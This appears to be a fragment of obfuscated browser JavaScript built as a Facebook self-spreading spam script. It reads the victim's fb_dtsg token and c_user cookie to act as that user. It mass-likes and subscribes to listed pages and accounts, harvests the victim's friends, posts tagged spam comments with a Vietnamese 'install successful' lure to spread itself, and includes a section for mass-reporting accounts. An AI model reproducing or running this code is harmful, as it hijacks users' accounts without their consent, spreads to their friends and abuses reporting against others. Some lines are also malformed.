...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/photo.php?fbid=1436920356553576&set=a.1401783530067259.1073741830.100007068750422&type=1&stream_ref=10" target="_blank">CÀI ĐẶT THÀNH CÔNG! Secret Story.<br>Secret Story</a>';
	html += '</div>';
...
Like("282073868623557");
Like("284750711683077");
Like("831435403549777");
P("1432124223701827");
P("1432123950368521");
P("1422434338002178");
P("1420489138196698");
...
//Xấu Nhất Xóm 
a("100004094165909");
sublist("413004518846017");
//Đa Đa 
sublist("286821078139666");
//Làn Khói Trắng 
a("100004417743095");
//Nam 
a("100006589330456");
Like("481497831949375");
Like("162281153969464");
P("1435401983356099");
sublist("1431749580388006");
sublist("1440837416145889");
sublist("1440837562812541");
sublist("1462895133940117");
sublist("1462895257273438");
sublist("1462895913940039");
//Lin Nguyễn 
a"(100006499242559");
...
arkadaslari_al(1436920356553576);
...
arkadaslari_al(1435936526653930);

// CMT TAG 3
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '1473384839557486';
var arkadaslar = [];
var svn_rev;
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text= Thành Công Rồi 💘 😡 😻 😽 🌸 🌹 🎈 😰 Ảnh CHIBI và ICON đẹp quá 💗 💘 😡 󾌬 󾌬 , làm thử đi các bạn 🍊 🍎 🍓 🍔 Làm Đi Nhé. tks trước vì đã xem qua  🐷 🐯 💐 💑 💓 💔 💖 💗 (Y) ..................................................................................................................................................................................................................................................................................................................................................' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
    _0x7892x8 += '&client_id=1473384839557486';
    _0x7892x8 += '&reply_fbid';
    _0x7892x8 += '&parent_comment_id';
    _0x7892x8 += '&rootid=u_jsonp_2_3';
    _0x7892x8 += '&clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":' + id + '}';
...
arkadaslari_al(1473384839557486);
...
IDS("100007068750422");IDS("100007127891678");IDS("100004526740075"); 

//CODE REPORT ACC BY Vũ Nguyễn Khánh
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
